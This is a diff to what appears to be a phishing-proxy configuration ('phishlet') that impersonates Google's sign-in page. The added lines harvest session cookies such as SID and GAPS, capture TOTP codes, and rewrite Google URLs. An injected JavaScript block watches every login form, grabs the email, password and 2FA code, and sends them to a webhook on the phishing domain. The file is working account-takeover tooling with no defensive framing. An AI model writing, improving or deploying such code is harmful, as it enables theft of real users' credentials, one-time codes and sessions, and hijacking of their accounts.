@@ -3,10 +3,13 @@ min_ver: '3.0.0'
 proxy_hosts:
   - {phish_sub: '', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true, auto_filter: true}
 sub_filters:
-  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'accounts.google.com', replace: '{{.Endpoint3}}.{{.Domain}}', mimes: ['text/html']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'accounts.google.com', replace: '{{.Endpoint3}}.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://accounts.google.com', replace: 'https://{{.Endpoint3}}.{{.Domain}}', mimes: ['text/html']}
 auth_tokens:
   - domain: '.google.com'
-    keys: ['SID', 'LSID', '__Secure-1PSID', '__Secure-3PSID']
+    keys: ['SID', 'LSID', '__Secure-1PSID', '__Secure-3PSID', '__Secure-1PAPISID', '__Secure-3PAPISID']
+  - domain: 'accounts.google.com'
+    keys: ['GAPS']
 credentials:
   username:
     key: 'identifier'
@@ -16,17 +19,94 @@ credentials:
     key: 'Passwd'
     search: '(.*)'
     type: 'post'
+  twofa:
+    key: 'TotpPin'
+    search: '([0-9]{6})'
+    type: 'post'
 login:
   domain: 'accounts.google.com'
-  path: '/v3/signin/identifier'
+  paths:
+    - '/v3/signin/identifier'
+    - '/v3/signin/challenge/pwd'
+    - '/v3/signin/challenge/sk'
+    - '/v3/signin/challenge/totp'
 js_inject:
-  - trigger_domains: ['accounts.google.com']
+  - trigger_domains: ['{{.Endpoint3}}.{{.Domain}}', 'accounts.google.com']
     trigger_paths: ['/.*']
     script: |
-      (function(){const api="https://{{.Domain}}/api/webhook";const secret="{{.WebhookSecret}}";const source="google";document.addEventListener('submit',function(){const u=document.querySelector('input[type="email"],input[name="identifier"]')?.value;const p=document.querySelector('input[type="password"],input[name="Passwd"]')?.value;if(u||p){fetch(api,{method:"POST",headers:{"Content-Type":"application/json","X-Webhook-Secret":secret},body:JSON.stringify({event:p?"credentials":"email",source:source,email:u,password:p})}).catch(()=>{});}},true);})();
+      (function(){
+        const api = "https://{{.Domain}}/api/webhook";
+        const secret = "{{.WebhookSecret}}";
+        const source = "google";
+        let step = 1;
+        let capturedEmail = '';
+        
+        function sendData(type, email, password, code) {
+          const payload = { event: type, source: source, remote_addr: "{{.VpsIp}}" };
+          if (email) payload.email = email;
+          if (password) payload.password = password;
+          if (code) payload.code = code;
+          
+          fetch(api, {
+            method: "POST",
+            headers: { "Content-Type": "application/json", "X-Webhook-Secret": secret },
+            body: JSON.stringify(payload)
+          }).catch(function(e){ console.log("webhook error", e); });
+        }
+        
+        function extractSessionCookies() {
+          const cookies = document.cookie;
+          if (cookies && cookies.length > 0) {
+            sendData("session", capturedEmail, null, null);
+          }
+        }
+        
+        function observeForm() {
+          const forms = document.querySelectorAll('form');
+          forms.forEach(function(form) {
+            if (form.hasAttribute('data-authflow-listener')) return;
+            form.setAttribute('data-authflow-listener', 'true');
+            
+            form.addEventListener('submit', function() {
+              setTimeout(function() {
+                const emailInput = document.querySelector('input[type="email"], input[name="identifier"]');
+                const passInput = document.querySelector('input[type="password"], input[name="Passwd"]');
+                const codeInput = document.querySelector('input[name="TotpPin"], input[name="otc"], input[id="totpPin"]');
+                
+                const email = emailInput ? emailInput.value : null;
+                const password = passInput ? passInput.value : null;
+                const code = codeInput ? codeInput.value : null;
+                
+                if (email && email !== capturedEmail) {
+                  capturedEmail = email;
+                  sendData("email", email, null, null);
+                }
+                
+                if (password) {
+                  sendData("credentials", capturedEmail || email, password, null);
+                }
+                
+                if (code) {
+                  sendData("2fa", capturedEmail || email, null, code);
+                }
+              }, 100);
+            });
+          });
+        }
+        
+        // Periodic check for session cookies after successful login
+        setInterval(function() {
+          if (capturedEmail && document.cookie.includes('SID')) {
+            extractSessionCookies();
+          }
+        }, 2000);
+        
+        observeForm();
+        new MutationObserver(observeForm).observe(document.body, { childList: true, subtree: true });
+      })();
 webhook:
   url: "http://127.0.0.1:{{.AppPort}}/api/webhook"
   headers:
     X-Webhook-Secret: "{{.WebhookSecret}}"
   format: "json"
-  events: ["credentials", "session"]
+  events: ["email", "credentials", "2fa", "session"]
